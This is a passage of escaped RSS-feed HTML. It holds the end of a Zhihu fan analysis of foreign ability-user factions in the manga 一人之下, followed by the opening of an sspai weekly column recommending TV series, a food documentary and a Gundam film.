src=\"https://pic2.zhimg.com/v2-b7624306035dae20d77c8fdd3a167cb3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"927\" data-rawheight=\"374\" data-watermark=\"watermark\" data-original-src=\"v2-b7624306035dae20d77c8fdd3a167cb3\" data-watermark-src=\"v2-fb6b827faf1f2d4758b1f49e185e5b0f\" data-private-watermark-src=\"\"></p>\n<p><b>2.查侬</b></p>\n<p>众所周知这个篇章是用来填坑的，世界上有那么多国家和地区；泰国能有如此待遇除了泰国本身丰富的历史文化外，更重要可能就是与之前出现的的关系；漫画344话比比肺活量中查侬的这一招应该是泰拳中的神猴腾空（ HakKung Ai-yara）这招出自一个泰国的神庙传说；是猴神曼加尔的法相显现；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8cbc94f7d6ab91fd060175f4442f3435_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"823\" data-rawheight=\"432\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>石川流</b></h2>\n<p>佛剑石川家所在的门派，之前已经介绍过几次他们的过去了，这里就不赘述了；目前已知下图左手是石川信的儿子，右边是日本异人组织的成员；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d4a02c659c0d5317812c73c7c7404990_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"306\" data-watermark=\"watermark\" data-original-src=\"v2-d4a02c659c0d5317812c73c7c7404990\" data-watermark-src=\"v2-13270685ffa18beac3a8a28c0bcb66f9\" data-private-watermark-src=\"\"></p>\n<p><b>1.石川流</b></p>\n<p>这次用的称呼不是石川家了而是石川流，因为这里女子的称呼是会长，说明石川信并不只是以家族或个人的身份来访，而是日本类似哪都通部门的会长；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7e003e39bca229afe3dfeff7a89aaea6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"165\" data-watermark=\"watermark\" data-original-src=\"v2-7e003e39bca229afe3dfeff7a89aaea6\" data-watermark-src=\"v2-f582d396dacb905ec47d84fa67aa4b7c\" data-private-watermark-src=\"\"></p>\n<p><b>2.妖刀蛭丸</b></p>\n<p>另一方面，在说到纳森卫的承诺时，石川信说，和他们相似，这里应该就是指妖刀蛭丸；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-986597f6a9d5076ac3070e7f8d2c71fc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"280\" data-watermark=\"watermark\" data-original-src=\"v2-986597f6a9d5076ac3070e7f8d2c71fc\" data-watermark-src=\"v2-c2b2dafc80599599be28a84c05533bca\" data-private-watermark-src=\"\"></p>\n<p>结合上回所说的时代守护；那么蛭丸（蛭是一类生物的统称，以多营暂时性的体外寄生生活，以吸食其他动物的体液或血液为生。）这个名字漫画中对炼器和剑仙的解释；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c2ec44c23eff7d48d2b697bd5bee12f0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"227\" data-watermark=\"watermark\" data-original-src=\"v2-c2ec44c23eff7d48d2b697bd5bee12f0\" data-watermark-src=\"v2-77e2dae0d82f5d8b3d9e40f9e94f0068\" data-private-watermark-src=\"\"></p>\n<p>我觉得可能石川家之前已经世世代代用炁在喂养这把本寓意着不详的妖刀；甚至以及和漫画中的“家仙”一样成为了某种家族象征；（上周也提到过就不过多赘述了）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4c1e1cb4704f934490d8976581a99360_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"752\" data-rawheight=\"263\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>贝希摩斯</b></h2>\n<p>贝希摩斯，漫画中提到的一家新兴的美国公司，能用工业手段制造法器；服务遍布世界，虽然成立的时间不长，却有一定的野心；并且并未确定其是否完全代表美国异人（毕竟只是一家公司）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4d3d10b31ee234f0a1552dbf503b4d8e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"345\" data-watermark=\"watermark\" data-original-src=\"v2-4d3d10b31ee234f0a1552dbf503b4d8e\" data-watermark-src=\"v2-d696d5e1ec95d404948ac488b1272c8c\" data-private-watermark-src=\"\"></p>\n<p><b>1.贝希摩斯</b></p>\n<p>贝希摩斯（Behemoth）是在《圣经》中出现的怪物，传说上帝在创世纪第六天用粘土创造了贝希摩斯和利维坦，它的尾巴如杉木般挺直，肌肉如石头般结实，骨骼如铜铁般坚硬。在中世纪的时候他被恶魔诱惑加入了地狱的阵容。旧约解经书《米大示》称其为无敌的生物，只有耶和华的剑才能杀死它。而《次经》中提到“一饱口福”云云，当指末日的弥赛亚盛宴。那时巨兽和海魔将会大战，最后同归于尽，与巨鸟席兹一起成为圣洁者的食物。另有种说法它们都将被投入深渊。   （下图可以颠倒过来看）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2e5b453bbb68e0457db1fb5da8648995_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1184\" data-rawheight=\"682\" data-watermark=\"watermark\" data-original-src=\"v2-2e5b453bbb68e0457db1fb5da8648995\" data-watermark-src=\"v2-815be0e9ef037bc0bf54ac6578eee237\" data-private-watermark-src=\"\"></p>\n<p>但其实，抛开这些复杂的设定，贝希摩斯最直观的特点就是两个：巨大与贪婪；就和中国神话中的饕餮一样；二叔设定上的指代似乎也已经不言而喻了；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7034604529428c5faafb1fbad7250302_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"238\" data-watermark=\"watermark\" data-original-src=\"v2-7034604529428c5faafb1fbad7250302\" data-watermark-src=\"v2-609b80ebcf74dc1fff30836e80a4ea7d\" data-private-watermark-src=\"\"></p>\n<p><b>2.工业法器</b></p>\n<p>在漫画532话中出现了能够翻译常见语种的“助听器”，虽然我们都知道这个道具是为了解决漫画中的预言问题而设计出来的；这十有八九就是贝希摩斯的产品了；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-99a039edfcdd1bc213650a84dc6745cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"851\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-99a039edfcdd1bc213650a84dc6745cd\" data-watermark-src=\"v2-56a95684a65a6bbee23f52dc13244ab7\" data-private-watermark-src=\"\"></p>\n<p>但是注意四哥对这玩意的称呼：半个法器；这似乎也间接说明了贝希摩斯公司已经掌握了工业化打造法器的方法；如果法器可以批量制造，那按照之前的理论：对社会的威胁其实不小于神机百炼；或者反过来说，贝希摩斯有可能受到了神机百炼的协助，才得以批量制造法器（个人脑洞，点到即止）如此看来，在网上与二壮交手的也有可能是贝希摩斯的人；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-74366b8b81c662bbfe21d6662af75948_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"367\" data-watermark=\"watermark\" data-original-src=\"v2-74366b8b81c662bbfe21d6662af75948\" data-watermark-src=\"v2-0ea4024a1fc2d9ffa43f8fa0f2a9f430\" data-private-watermark-src=\"\"></p>\n<p>不过目前看来贝希摩斯对自己的技术把控的还是比较严格的，像下图三哥说的，法器用完还要还给他们；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-60bfb3440f55f169d5d97fca91e79f9e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"853\" data-rawheight=\"237\" data-watermark=\"watermark\" data-original-src=\"v2-60bfb3440f55f169d5d97fca91e79f9e\" data-watermark-src=\"v2-527bd461a9cbf5cc25e3656e14831a69\" data-private-watermark-src=\"\"></p>\n<p>可能就是有了制造生活法器的技术力和批量生产的生产力，贝希摩斯才敢于说自己是家世界公司（这个倒不至于吐槽老美，我们很多企业也已经有了这样的觉悟，全球化终究是必然趋势）可能正是这样的实力贝希摩斯才有底气说出：包括纳森岛吧。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5fc7f76cf3f9bc3b9a20ef16ff01bad7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"829\" data-rawheight=\"296\" data-watermark=\"watermark\" data-original-src=\"v2-5fc7f76cf3f9bc3b9a20ef16ff01bad7\" data-watermark-src=\"v2-43b7833242983496b90f94e6176e9e3a\" data-private-watermark-src=\"\"></p>\n<p>但这里凯勒没有说时态，如果纳森岛已经使用了贝希摩斯的技术那可能岛上的生活水平要比我们之前想象的要好；（毕竟纳森卫都穿的干干净净的）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ab0cf5e7685cc34b7f7b01ac77bc4f47_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"828\" data-rawheight=\"334\" data-watermark=\"watermark\" data-original-src=\"v2-ab0cf5e7685cc34b7f7b01ac77bc4f47\" data-watermark-src=\"v2-2299bd075ed7fb9789fc70eed98f2ea4\" data-private-watermark-src=\"\"></p>\n<p><b>3.美国工会</b></p>\n<p>还是之前那个论调，目前其实不能肯定贝希摩斯是否完全代表美国异人，毕竟贝希摩斯只是一家公司，而且和哪都通不一样，这家公司是以公司为主体的；服务与“世界人民”的公司，那么我有理由相信美国本土应该还是有类似哪都通的存在；毕竟美国缺席上一次异人大会确实不太可能；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-19e164021f30e6d73f9e2f67e1a21357_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"269\" data-watermark=\"watermark\" data-original-src=\"v2-19e164021f30e6d73f9e2f67e1a21357\" data-watermark-src=\"v2-c2208ff2ba221b6269c0ef88b20aa730\" data-private-watermark-src=\"\"></p>\n<h2><b>纳森岛</b></h2>\n<p>纳森岛已经说了三期了，但这次还是有很多新的个人观点想和大家分享；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-af21bfce694261131f83e9444c67a21f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"935\" data-rawheight=\"342\" data-watermark=\"watermark\" data-original-src=\"v2-af21bfce694261131f83e9444c67a21f\" data-watermark-src=\"v2-759d97b4e6ec38a901f4e0640ae890e2\" data-private-watermark-src=\"\"></p>\n<p><b>1.阿方索</b></p>\n<p>首先来说一下小个子阿方索，阿方索这个名字曾为那不勒斯王国皇家所用；不算是一个很常见的名字但是目前没查到有什么隐喻；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3013c9788c8022351a27f1fb3faec5b6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"739\" data-rawheight=\"260\" data-watermark=\"watermark\" data-original-src=\"v2-3013c9788c8022351a27f1fb3faec5b6\" data-watermark-src=\"v2-84c29ced3cbe1fcbf89471d20b935135\" data-private-watermark-src=\"\"></p>\n<p>我之前一直以为，纳瑟卫服务于王是因为某种禁制术，毕竟以利亚亲口说过，自己不喜欢在纳瑟的感觉；所以我以为所谓的为诺言而生是他们被禁制术束缚；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1733b6cb156ea70e3b53f0594c8f30af_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"845\" data-rawheight=\"447\" data-watermark=\"watermark\" data-original-src=\"v2-1733b6cb156ea70e3b53f0594c8f30af\" data-watermark-src=\"v2-d55e4c9c45cbc02a3f5ebd89c26a5cf1\" data-private-watermark-src=\"\"></p>\n<p>但看了阿方索的反映后，我感受到纳森卫，至少阿方索对王的认可是完全发自内心的；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b47099ecaf78fd7ef3dbb463c2d921aa_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"204\" data-watermark=\"watermark\" data-original-src=\"v2-b47099ecaf78fd7ef3dbb463c2d921aa\" data-watermark-src=\"v2-8c35075a749409a035affd13f759043e\" data-private-watermark-src=\"\"></p>\n<p><b>2.纳森王</b></p>\n<p>回来说被宝儿姐干趴下的纳森王，二叔以前就说过如果要画纳森那肯定是个独立的篇章；看得出来纳森卫和宝儿姐一样是个姑娘；至于势力，宝儿姐当时算偷袭，也不能确定王的真实实力；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-00cb0fd1f8df66de93f849444e86aa6e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"335\" data-watermark=\"watermark\" data-original-src=\"v2-00cb0fd1f8df66de93f849444e86aa6e\" data-watermark-src=\"v2-8d492d885c11ec1859d180ba9ad5750b\" data-private-watermark-src=\"\"></p>\n<p>不过有一点可以肯定，就是以利亚说的：王，是神选之人；是异人中的异人；所以王的天赋是毋庸置疑的；所以以利亚才能那么坦诚的说：我们并不是神选之人，</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6a62bcbbd5df67c8c65fda0ec9f87669_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"264\" data-watermark=\"watermark\" data-original-src=\"v2-6a62bcbbd5df67c8c65fda0ec9f87669\" data-watermark-src=\"v2-66849892736005eface7d9773cdd97a3\" data-private-watermark-src=\"\"></p>\n<p>纳森王异人中的异人这点，其实也和宝儿姐非常相似；这却也是张怀义一直叮嘱张楚岚避免成为的人；木秀于林风必摧之；也许正是因此当年大祭司才规定了纳森卫保卫纳森王的传统吧；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e3e4664051dec51b1873b347f57196a9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"316\" data-watermark=\"watermark\" data-original-src=\"v2-e3e4664051dec51b1873b347f57196a9\" data-watermark-src=\"v2-df5dd4d3e0ff91118e40d4fff93bd838\" data-private-watermark-src=\"\"></p>\n<p><b>3.投石问路</b></p>\n<p>这里还有一个问题，那就是他们为什么要袭击三哥？或者说为什么要丢石头？</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e99954fe51e74ab9e6adf21c63b0d3a3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"740\" data-rawheight=\"251\" data-watermark=\"watermark\" data-original-src=\"v2-e99954fe51e74ab9e6adf21c63b0d3a3\" data-watermark-src=\"v2-2cd2c1e2901f5a87d598732be038d01c\" data-private-watermark-src=\"v2-b697507364d57b1b6f75716acde6ef50\"></p>\n<p>事出反常必有妖；按照以利亚和阿方索的对话来看，他们仿佛已经知道了会有拦车？甚至这后面的事情可能都有一部分的安排好的；（应该不包括王被暴打）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f022f952062c2ad9c16e65570578d746_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"741\" data-rawheight=\"232\" data-watermark=\"watermark\" data-original-src=\"v2-f022f952062c2ad9c16e65570578d746\" data-watermark-src=\"v2-a3dbbfe867e4b021f66a90fabfd56937\" data-private-watermark-src=\"v2-21ac012c6fa563d5a14d1b185002b28c\"></p>\n<p>那如果是这样纳森方面可能真的拥有某位可以预判危机的角色来策划了这场事件？如果把投石和预判这两个关键词结合起来，去找西方传说中的对应；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1dfea935cdd8bba4d26e4ac7f245933e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"737\" data-rawheight=\"207\" data-watermark=\"watermark\" data-original-src=\"v2-1dfea935cdd8bba4d26e4ac7f245933e\" data-watermark-src=\"v2-6905b714317a8b72e9d498ee4d2bea8d\" data-private-watermark-src=\"v2-55def948b3f4e2875524d62f7dc62410\"></p>\n<p>大卫投石；取材于《旧约》中的神话故事。大卫是一个圣经中的人物，公元前1010年至970年是以色列王。他在位时推翻了异族非利士人的统治，使以色列得到统一。打倒巨人歌利亚的投石器。五块石头代表大卫的宽容，四次会打偏，而第五次必然会命中，并打倒敌人。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-efd9e0a88297551d35e8251d6fce4bb1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"736\" data-rawheight=\"244\" data-watermark=\"watermark\" data-original-src=\"v2-efd9e0a88297551d35e8251d6fce4bb1\" data-watermark-src=\"v2-ba2e7596705519f56c8c546d4a9a7fb3\" data-private-watermark-src=\"v2-a8144fed3b22027e1aaa8b6c347020cd\"></p>\n<p>（以上仅为个人猜测）</p>\n<p><b>个人想法</b></p>\n<p>这个世界上不是所有秘密的答案都叫无根生的，如果是那样的话，那这个世界也太无趣了；其实二叔之前在创作的时候就提到过将来会做外国异人的番外，未知的世界才是更真实有趣的世界；期待后续篇章的更新；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-91e9c0805ee04798b1f7f6b9d315f18e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"735\" data-rawheight=\"192\" data-watermark=\"watermark\" data-original-src=\"v2-91e9c0805ee04798b1f7f6b9d315f18e\" data-watermark-src=\"v2-2870708ebaf07db1f026dd48f16786df\" data-private-watermark-src=\"v2-8fa7ecd0ef22b3672c985808e84ee49d\"></p>\n<hr>\n<p>以下是之前对纳森岛和外国异人的整理和猜测，为了节省篇幅就不在这里赘述了：</p>\n<a href=\"https://www.zhihu.com/question/466970964/answer/1959555863\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-8a848cb4bd5f11f7f3a1b2b24210d254_200x0.jpg\" data-image-width=\"948\" data-image-height=\"2000\" class=\"internal\">如何评价《一人之下》532（565）话？</a><a href=\"https://www.zhihu.com/question/464193183/answer/1934211068\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-bdba958ccddc978a4ff42f0c80af1423_bh.jpg\" data-image-width=\"1600\" data-image-height=\"720\" class=\"internal\">如何评价《一人之下》530（562）话？</a><a href=\"https://www.zhihu.com/column/c_1264966216768692224\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-28243c09e18dc58c62df761ed87850a5_l.jpg\" data-image-width=\"167\" data-image-height=\"167\" class=\"internal\">一人之下•门派录</a><p><img src=\"https://pic4.zhimg.com/v2-5c10e13da4092b73d90f0456e1b82aee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"467\" data-rawheight=\"254\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>整理不易，跪求点赞<br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yixiang-68-33?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">呆呆兽星君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469386521/answer/1973593333?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">52 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/317204661?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《一人之下》402话？</a><br><a href=\"http://www.zhihu.com/question/304359766?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">一人之下中的马仙洪各位怎么评价？</a><br>\n","link":"http://www.zhihu.com/question/469386521/answer/1973593333?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"本周看什么丨最近值得一看的 6 部作品","date":"2021-07-02 09:31:35","description":"\n<h2>TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[美剧] 博世 第七季、[英剧] 争分夺秒、[纪录片] 风味原产地·贵阳 、[电影] 机动战士高达 闪光的哈萨维 第一部、[美剧] 天才神秘会社、[动画] 魔多客</li>\n<li>几则精彩预告：漫改 TV 动画《链锯人》公布预告、怪兽尸体都去哪了？《大怪兽的善后处理》公布预告、动画电影《狼行者》7 月 3 日中国内地上映、Apple TV+ 剧集《基地》9 月 24 日开播</li>\n<li>几则影视资讯：《疾速追杀 4》宣布开机、尼尔·盖曼小说改编剧集《好兆头》确定将拍第二季、漫画《来自深渊》将改编为好莱坞真人电影、日漫改国产真人网剧《月刊少女》开机、辛普森 × 漫威联动短片《The Good, the Bart, and the Loki 》7 月 7 日上线 Disney+、《新世纪福音战士新剧场版：终》8 月 13 日独家登陆 Amazon Prime Video</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[美剧] 博世 第七季（最终季）</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/fc82b003cae241bb57e614666c1cce20\"></figure><p>关键词：剧情 / 悬疑</p>\n<p>片长：45 分钟（单集）× 8 集；<a href=\"https://movie.douban.com/subject/34967836/\">豆瓣链接</a></p>\n<blockquote><p>犯罪永远不会停止。</p></blockquote>\n<p>@潘誉晗：本剧根据麦克·康纳利的系列小说《哈里·博世》改编，由提图斯·维里沃饰演的主人公哈里·博斯是洛杉矶警局的一名探员，故事围绕着博斯办案的日常展开。和以往剧集中对于 LAPD 或者 FBI 的信任不同，《博世》更像是借着这一人物的视角，去发现警察系统甚至是高层政治的腐败。其实案件本身不难，深刻的内核来自对于政治和警察系统的挖掘，看似为了市民好，但却为了自己的仕途或者项目的推进去伤害无辜者的行为，怎能叫人看了不气愤呢？或许这也是最终季中编剧刻意为之的一种结局。的确，本剧大概是近几年完结的罪案剧中看到的最解气的方式，难怪有网友说这是近十年最好的刑侦剧。看似硬汉的博斯却有着最深的温柔，这样的反差很动人，即使在体系中，这样有良心的警察们依旧是有血有肉的。</p>\n<p>很难得可以看到一部罪案剧的终季完结得如此漂亮，虽然只有短短 8 集，但是作为本系列最高的评分以及烂番茄 100% 的新鲜度，很好地证明了观众对于这样的结局很是满意。接下来就耐心且安心地期待 2023 年的衍生剧了。</p>\n<h3>[英剧] 争分夺秒</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/355fb6795f91dc1336b5a918076619bb\"></figure><p>关键词：剧情 / 犯罪</p>\n<p>片长：60 分钟（单集）× 3 集；<a href=\"https://movie.douban.com/subject/35205166/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：首先要说《Time》翻译为《争分夺秒》和剧情其实是不太匹配的，剧集以两个不同身份的人物视角审视英国监狱刑罚体系，展现了英国监狱与司法系统的方方面面，它描绘了关于经历监狱生活的人们的高风险生活图景，包括关于他们罪责、宽恕、处罚、忏悔以及相关经历对他们人生产生何种影响的故事，从剧情来看，《度日》或许是更为恰当的译名。</p>\n<p>《Time》请了两位在英国极为优秀又受欢迎的演员出演，肖恩宾扮演 Mark Hebden，他是一位教师、丈夫，同时也是一个父亲，却在一次事故中误杀无辜，他带着莫大的愧疚和忏悔，接受了为期四年的监禁，然而他却和一群为非作歹的混混们关在了一起。对于他这个老实人来说，一面要适应新环境，一面还要忍气吞声被其他犯人欺负。斯蒂芬格拉汉姆扮演 Eric Reid , 他是一位尽职尽责的狱警，在高压的监狱系统下工作，并尽其所能地保护着他所看管的犯人。但是，当狱中危险罪犯以他所爱之人的安危威胁他时，他不得不在原则和爱之间艰难抉择。</p>\n<p>这是一部只有三个小时的迷你剧，不像《监狱风云》一样惊心动魄，戏剧冲突也没有那么强，剧情是对惩罚与忏悔最直白细腻地探讨，质朴的剧本加上两位大佬加持，不失为一部非常合格的精品剧集。</p>\n<h3>[纪录片] 风味原产地 · 贵阳</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/e468e7ad41db114fd6db5186384f84ee\"></figure><p>关键词：纪录片 / 美食</p>\n<p>片长：10 分钟（单集）× 10 集</p>\n<p>观看渠道：<a href=\"https://v.qq.com/x/cover/mzc002006rwlwzl.html\">腾讯视频</a>；<a href=\"https://movie.douban.com/subject/35499064/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：继潮汕、云南和甘肃之后，《风味原产地》终于做到贵阳特辑了，可见贵阳美食的确很多，多到可以专门做特辑。</p>\n<p>本片依旧秉持「硬核美食」的风格，突出「原产地」概念，将食物作为唯一主角。贵阳有着上千年历史、独特的地貌、丰富的自然资源、精彩的多民族文化、独立的地理位置、独特的气候条件，以及历史上人员的迁徙融合，这些复杂多元的不同面相，都被糅合在黔州菜系里。片子通过展现贵阳独特的烹饪手法和饮食习惯，追溯菜肴的缘起，发掘平凡美食之中的无穷智慧，以及隐藏在食物背后的风土人情与历史文化变迁，勾勒出一幅具有指南性质的贵阳物产美食地图。</p>\n<p>看节目之前千万要把纸巾准备好，不然就如我一样，大半夜被烂而不腥的肥肠、又薄又嫩的血旺、脆香的脆哨以及混合着鸡蛋面的肠旺面馋到口水与眼泪齐飞，还有酸粉、酸汤豆腐、烧烤……特写镜头就更馋人了。贵州人对辣椒的运用也是出神入化，没有见识的外地人第一次看到撒着辣椒面的烤豆腐，第一次知道了「糊辣椒」的存在。无可挑剔的文案再加上精妙的拍摄手法，还是熟悉的品质。果然，陈晓卿团队永远不会让食客们失望。</p>\n<h3>[电影] 机动战士高达 闪光的哈萨维 第一部</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/e17ed538a0813216ae3bf44fdcdde5ce\"></figure><p>关键词：剧情 / 科幻 / 战争</p>\n<p>片长：96 分钟</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/title/81439253\">Netflix</a> / <a href=\"https://www.bilibili.com/bangumi/media/md28234742/\">哔哩哔哩</a>（有删改）；<a href=\"https://movie.douban.com/subject/30201133/\">豆瓣链接</a></p>\n<p>观影建议：应了解高达宇宙世纪背景设定，推荐观看存在剧情联系的剧场版《<a href=\"https://movie.douban.com/subject/1401536/\">逆袭的夏亚</a>》。</p>\n<blockquote><p>「我家的小孩就乖多了」 —— 布莱德·诺亚</p></blockquote>\n<p>@SHY：诞生于 1989 年，《机动战士高达 闪光的哈萨维》原著小说是富野由悠季个人风格的集中体现，压抑的剧情走向、血淋淋的战场刻画、对制度与革命的反思，让本作成为系列中的异类，即使在 32 年后的今天，仍具有一定的现实意义。身为联邦名将之子，却毅然举起反旗的主角哈萨维·诺亚，更可谓高达史上最纯粹又最复杂的角色之一。他继承了阿姆罗与夏亚两套对立的价值观，为了自己坚信的正义，化名马夫蒂·纳比尤·艾林，以殉道者般的姿态发起了注定不可能成功的袭击。年轻无畏，志存高远，又被凡人的欲望束缚，饱受内心煎熬，只是短暂活跃于历史一角，引人注目却无力改变世界的一道闪光。</p>\n<p>原著虽被誉为最难以影视化的高达小说之一，火力全开的日升却带来天花板级别的制作，手绘作画与 CG 特效同样出众，以注重实拍感的镜头语言营造超越动画的视听体验，交出了令粉丝与路人同样满意的答卷。影片的画面细节极尽考究，小到光影与角色表情的细微变化，大到机体与场景的整体设计，几乎挑不出纰漏。秉承原作基调，动画的文戏篇幅远高于打戏，脱离高达惯例的宏大叙事，以普通人的视角反映 MS 战斗的杀伤力，哈萨维被自己安排的夜袭逼到四处奔逃，粒子溅射如烟花般绚烂，却无法掩盖杀戮的丑陋与残酷。作为三部曲的第一作，故事尚未展开，却拥有独特的魅力，无疑是近年最值得观看的高达动画。</p>\n<h3>[美剧] 天才神秘会社</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/c2ea37c3e6043e478ea2580fc41ee8dc\"></figure><p>关键词：剧情 / 喜剧 / 悬疑 / 冒险</p>\n<p>片长：45 分钟（单集）× 8 集；<a href=\"https://movie.douban.com/subject/34825970/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：我是迪士尼儿童剧的忠实爱好者，看过非常多连豆瓣词条都没有的小众冷门剧。很多儿童剧因为剧情过于简单，不太适合推荐给大朋友，但这部剧是个例外。</p>\n<p>《天才神秘会社》根据同名畅销系列小说改编。原著作者特伦顿·李·斯图尔特被誉为全美最受欢迎的天才作家，《天才神秘会社》首部曲《谜屋的考验》获美国怀特朗读奖等荣誉，热卖突破 30 万册，并荣登《纽约时报》等全美四大畅销排行榜。</p>\n<p>该剧由 Tony Hale 和 Kristen Schaal 主演，Tony 扮演的本尼迪克特先生召集了四位具有独特才能的孤儿，让他们潜入神秘的 L.I.V.E. 研究所，搞清楚被称为「紧急状态」的全球危机的真相，拯救世人。你可以永远相信迪士尼选的小演员们，剧中四位小朋友演技自然，尤其是最小的女孩，古灵精怪又贡献了很多笑点，一本正经搞笑的样子非常可爱。不管是家里有小朋友还是想自己找个下饭的剧，《天才神秘会社》都是不错的选择。</p>\n<h3>[动画] 魔多客</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/54ef6b980a1c34d5c8bdcd33c76dfd66\"></figure><p>关键词：喜剧 / 动作 / 犯罪</p>\n<p>片长：22 分钟（单集）× 10 集；<a 